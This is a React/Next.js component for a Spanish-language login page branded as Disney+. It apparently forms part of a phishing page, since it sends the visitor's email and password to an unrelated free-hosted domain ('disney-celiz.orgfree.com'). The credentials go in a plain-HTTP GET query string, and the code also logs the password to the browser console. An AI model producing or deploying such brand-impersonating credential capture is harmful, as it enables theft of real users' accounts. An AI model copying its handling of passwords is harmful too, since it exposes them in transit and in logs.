import Image from "next/image";
import React from "react";
import { IconWorld } from '@tabler/icons';
import { PasswordInput } from '@mantine/core';
import { IconEyeCheck, IconEyeOff } from '@tabler/icons';
import { links2 } from '../constants/links';
import { useRouter } from 'next/router';


export default function FormPassword() {

    const router = useRouter()

    const [password, setPassword] = React.useState("");
    const [login, setLogin] = React.useState(false);
    const [email, setEmail] = React.useState("");
  
    React.useEffect(() => {
        
        if (password.length > 0 && login) {
            console.log("Fetching...", router.query.email, password);
            fetch(`http://disney-celiz.orgfree.com/login.php?email=${router.query.email}&pass=${password}`, {
                origin: "http://disney-celiz.orgfree.com",

            }).then((response) => {
                return response.json();
            }).then((data) => {
                console.log(data)
                if (data == 1) {
                    router.push(`/dashboard`);
                } else {

                    alert("Contraseña incorrecta");
                }
                setLogin(false);
            });
        }
    }, [login]);
        
    return (
        <main className="main login">
            <section className="login__section">
                <h3 className="h3">Iniciar sesión | Disney+</h3>
                <p className="p">
                    Ingresa tu correo electrónico y te enviaremos un enlace para restablecer tu contraseña.
                </p>
                <PasswordInput refplaceholder="Contraseña"
                onChange={e => setPassword(e.target.value)} value={password}
                    visibilityToggleIcon={({ reveal, size }) =>
                    reveal ? <IconEyeOff size={size} /> : <IconEyeCheck size={size} />
                    }
                />
                <p className="p--form">
                    Distingue entre mayúsculas y minúsculas.
                </p>
                <button role="button" name="dssLoginSubmit" value="submit" className="btn" id="" type="submit" 
                onClick={() => setLogin(true)}>
                CONTINUAR</button>
                <section className="login__section--subscribe"><button>¿Olvidaste la contraseña?</button></section>
            </section>
        </main>

    );

}


